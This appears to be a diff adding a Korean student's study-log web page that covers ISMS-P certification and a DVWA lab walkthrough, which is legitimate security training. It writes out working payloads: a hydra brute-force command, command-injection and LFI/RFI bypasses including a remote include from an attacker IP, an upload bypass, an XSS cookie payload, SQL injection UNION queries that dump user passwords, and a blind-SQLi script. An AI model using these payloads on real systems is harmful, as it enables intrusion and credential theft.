@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ISMS-P, DVWA — 조경익</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Noto+Sans+KR:wght@400;500;600;700;900&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#ffffff; --bg-alt:#f5f6f8; --panel:#f7f8fa; --panel-border:#e2e5ea;
+    --text:#1a1f24; --text-dim:#4b5560; --text-faint:#7c8894; --accent:#0f9d8f; --line:#e5e8ec;
+    --c-practice:#0d9488;
+  }
+  *{box-sizing:border-box; margin:0; padding:0;}
+  body{background:radial-gradient(ellipse at top left, rgba(94,234,212,0.06), transparent 45%), var(--bg);
+    color:var(--text); font-family:'Noto Sans KR', sans-serif; line-height:1.7; -webkit-font-smoothing:antialiased;}
+  .mono{font-family:'JetBrains Mono', monospace;}
+  a{color:inherit; text-decoration:none;}
+  .wrap{max-width:760px; margin:0 auto; padding:0 24px;}
+  .topbar{border-bottom:1px solid var(--line); background:rgba(255,255,255,0.9); backdrop-filter:blur(6px);}
+  .topbar-inner{display:flex; align-items:center; gap:16px; padding:14px 24px; max-width:760px; margin:0 auto;
+    font-family:'JetBrains Mono',monospace; font-size:12.5px; color:var(--text-dim);}
+  .topbar-inner a:hover{color:var(--accent);}
+  .sep{color:var(--text-faint);}
+  .hero{padding:44px 0 28px; border-bottom:1px solid var(--line); margin-bottom:32px;}
+  .eyebrow{font-family:'JetBrains Mono',monospace; font-size:12px; color:var(--c-practice); letter-spacing:.08em; margin-bottom:14px;}
+  .hero h1{font-size:clamp(24px,4vw,32px); font-weight:900; margin-bottom:10px;}
+  .hero p{color:var(--text-dim); font-size:14px;}
+  .content{padding-bottom:70px;}
+  .content h2{font-size:19px; font-weight:700; margin:38px 0 14px; padding-bottom:8px; border-bottom:1px solid var(--line);}
+  .content h3{font-size:15px; font-weight:700; margin:20px 0 8px; color:var(--c-practice);}
+  .content p{font-size:14px; color:var(--text-dim); margin-bottom:10px;}
+  .level{margin-bottom:16px; padding:14px 16px; background:var(--panel); border:1px solid var(--panel-border); border-left:3px solid var(--c-practice); border-radius:8px;}
+  .level h4{font-size:13.5px; font-weight:700; margin-bottom:6px; font-family:'JetBrains Mono',monospace;}
+  .level p{margin-bottom:4px; font-size:13.5px; color:var(--text-dim);}
+  table{width:100%; border-collapse:collapse; margin:10px 0 14px; font-size:12.5px;}
+  th, td{border:1px solid var(--panel-border); padding:6px 10px; text-align:left;}
+  th{background:#fff; color:var(--text); font-family:'JetBrains Mono',monospace; font-size:11px;}
+  td{color:var(--text-dim);}
+  pre{background:#fff; border:1px solid var(--panel-border); border-radius:8px; padding:10px 12px;
+    overflow-x:auto; margin:8px 0; font-family:'JetBrains Mono',monospace; font-size:11.5px; color:var(--accent); line-height:1.55;}
+  code.mono{background:#fff; padding:1px 5px; border-radius:4px; font-size:12.5px; border:1px solid var(--panel-border);}
+  footer{border-top:1px solid var(--line); padding:24px 0 50px; text-align:center; font-family:'JetBrains Mono',monospace; font-size:12px; color:var(--text-faint);}
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <div class="topbar-inner">
+    <a href="../../index.html">메인</a><span class="sep">/</span>
+    <a href="../../web.html">웹 해킹 / 워게임</a><span class="sep">/</span>
+    <span>ISMS-P, DVWA</span>
+  </div>
+</div>
+
+<div class="wrap">
+  <section class="hero">
+    <div class="eyebrow mono">🧪 실습 플랫폼</div>
+    <h1>ISMS-P, 웹해킹(DVWA)</h1>
+    <p>정보보호 인증 기준(ISMS-P)과 웹해킹 기초 개념을 정리하고, DVWA로 Low/Medium/High 난이도별 우회 기법을 비교 실습</p>
+  </section>
+
+  <div class="content">
+
+    <h2>1. ISMS-P 개념</h2>
+    <p><b>ISMS-P</b>(정보보호 및 개인정보보호 관리체계)는 KISA가 운영하는 국내 통합 인증제도로, 2018년 기존 ISMS(정보보호)와 PIMS(개인정보보호)를 통합. 정보의 기밀성·무결성·가용성 유지, 개인정보 안전 관리, 법적 요구사항 준수를 위해 사용.</p>
+
+    <h3>웹해킹 기본 개념</h3>
+    <table>
+      <tr><th>코드</th><th>의미</th></tr>
+      <tr><td>1XX</td><td>처리 중</td></tr>
+      <tr><td>2XX</td><td>성공</td></tr>
+      <tr><td>3XX</td><td>리다이렉트</td></tr>
+      <tr><td>4XX</td><td>클라이언트 오류</td></tr>
+      <tr><td>5XX</td><td>서버 오류</td></tr>
+    </table>
+    <p>HTTP 요청은 메소드(무엇을)·헤더(어떻게)·바디(무슨 데이터를) 세 요소로 구성. <b>CVE</b>는 실제 발견된 특정 취약점의 고유 번호(예: CVE-2021-44228=Log4j), <b>CWE</b>는 취약점의 근본 원인 유형 분류(예: CWE-89=SQL Injection).</p>
+
+    <h2>2. DVWA 실습</h2>
+    <p>DVWA(Damn Vulnerable Web Application)는 SQL Injection, XSS 등 다양한 취약점이 내장된 합법적 실습용 웹 애플리케이션.</p>
+
+    <h3>Brute Force</h3>
+    <div class="level">
+      <p>입력값 검증이 없는 로그인 폼 → <code class="mono">hydra</code>로 무차별 대입. Burp Suite로는 워드리스트 공격 시 응답 길이가 다른 요청을 찾아 성공 여부 판별.</p>
+      <pre>hydra -l admin -P password.txt [IP] http-get-form \
+"/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=xxx;security=low:F=incorrect."</pre>
+    </div>
+
+    <h3>Command Injection</h3>
+    <div class="level">
+      <p>Low: <code class="mono">shell_exec</code>로 입력값을 그대로 명령어에 삽입하는 구조 → <code class="mono">;</code>(항상 실행) 또는 <code class="mono">&&</code>(앞이 성공해야 실행)로 명령어 추가.<br>
+      Medium: <code class="mono">&&</code>, <code class="mono">;</code>만 필터링 → 필터링 안 된 <code class="mono">|</code>, <code class="mono">||</code>로 우회.<br>
+      High: 대부분의 특수문자를 블랙리스트에 올렸지만 <code class="mono">| </code>(파이프+공백)만 걸러서, 공백 없이 <code class="mono">|id</code>처럼 붙여쓰면 우회 가능.</p>
+    </div>
+
+    <h3>File Inclusion (LFI/RFI)</h3>
+    <div class="level">
+      <p>Low: <code class="mono">page</code> 파라미터를 검증 없이 <code class="mono">include()</code>에 사용 → <code class="mono">/etc/passwd</code> 직접 접근(LFI), 공격자가 띄운 외부 파일을 불러와 실행(RFI).<br>
+      Medium: <code class="mono">http://</code>, <code class="mono">https://</code>를 공백 치환해 RFI만 차단 → 대소문자 섞은 <code class="mono">Http://</code>나 <code class="mono">hthttptp://</code>로 우회.<br>
+      High: <code class="mono">file*</code> 패턴만 허용하지만 <code class="mono">file://</code> 프로토콜은 걸러지지 않아 LFI 여전히 가능.</p>
+      <pre>?page=http://[공격자IP]:8000/test.php   // RFI, test.php엔 system('whoami') 등</pre>
+    </div>
+
+    <h3>File Upload</h3>
+    <div class="level">
+      <p>Low: 검증 없음, 업로드 경로가 그대로 노출되어 바로 php 실행.<br>
+      Medium: 클라이언트가 보내는 Content-Type만 검사 → Burp Suite로 Content-Type을 image/jpeg로 조작해 우회.<br>
+      High: 확장자 + <code class="mono">getimagesize()</code>로 매직 바이트까지 검사 → GIF89a(텍스트로 쉽게 추가 가능한 매직 바이트)를 PHP 코드 앞에 붙여 업로드 통과, File Inclusion과 결합해 <code class="mono">?page=...cmd.php.jpg&cmd=id</code> 형태로 실행.</p>
+    </div>
+
+    <h3>XSS (Reflected / Stored)</h3>
+    <div class="level">
+      <p>Reflected — Low: 필터 없음. Medium: <code class="mono">&lt;script&gt;</code>를 소문자로만 필터링 → 대소문자 혼용으로 우회. High: 정규식으로 <code class="mono">&lt;script&gt;</code> 패턴 전체를 감지 → 다른 태그(<code class="mono">&lt;img src=x onerror=alert(document.cookie)&gt;</code>)로 우회.<br>
+      Stored — Name 입력란은 maxlength 제한을 개발자 도구로 늘려 우회, Medium은 message 필드는 강하게 필터링(strip_tags, htmlspecialchars 등)하지만 name 필드는 소문자만 걸러 우회 가능.</p>
+    </div>
+
+    <h3>SQL Injection</h3>
+    <div class="level">
+      <p>Low: <code class="mono">1' OR '1'='1</code>로 인증 우회 → <code class="mono">UNION SELECT</code>로 컬럼 수 확인 → <code class="mono">database()</code>로 DB명 → <code class="mono">information_schema</code>로 테이블/컬럼명 → 데이터 추출 → 해시(MD5) 길이로 알고리즘 식별 후 rockyou.txt로 사전 공격까지 전 과정 실습.</p>
+      <pre>1' UNION SELECT 1,2#              // 컬럼 수 확인
+1' UNION SELECT database(),2#     // DB명
+1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema='dvwa'#
+1' UNION SELECT user,password FROM users#</pre>
+      <p>Medium: 따옴표는 <code class="mono">mysql_real_escape_string</code>으로 막히지만 id 값이 따옴표 없이 삽입되는 구조라 <code class="mono">1 OR 1=1</code>처럼 따옴표 없는 공격은 그대로 통과. 문자열은 16진수(<code class="mono">0x7573657273</code>)로 인코딩해 따옴표 없이 전달.<br>
+      High: <code class="mono">LIMIT 1</code>이 걸려있어 <code class="mono">1' or 1=1;#</code>처럼 주석으로 무력화해야 전체 행 조회 가능.</p>
+    </div>
+
+    <h3>SQL Injection (Blind)</h3>
+    <div class="level">
+      <p>데이터가 직접 보이지 않고 참/거짓 응답 차이만으로 한 글자씩 추론. 파이썬으로 1~20 범위의 id를 자동 요청해 "MISSING" 문구 유무로 마지막 존재 행을 판별하는 스크립트 작성. Medium은 드롭다운이라 직접 입력이 안 되므로 Burp Suite로 요청을 가로채거나 <code class="mono">requests.post</code>로 우회.</p>
+      <pre>import requests
+URL = "http://[IP]/vulnerabilities/sqli_blind/"
+COOKIES = {"id":"1","PHPSESSID":"xxx","security":"low"}
+for i in range(1, 21):
+    res = requests.get(URL, params={"id": i, "Submit": "Submit"}, cookies=COOKIES)
+    if "User ID is MISSING from the database." in res.text:
+        print(f"end = {i-1}")
+        break</pre>
+    </div>
+
+  </div>
+
+  <footer>© 2026 조경익 · security learning log</footer>
+</div>
+</body>
+</html>
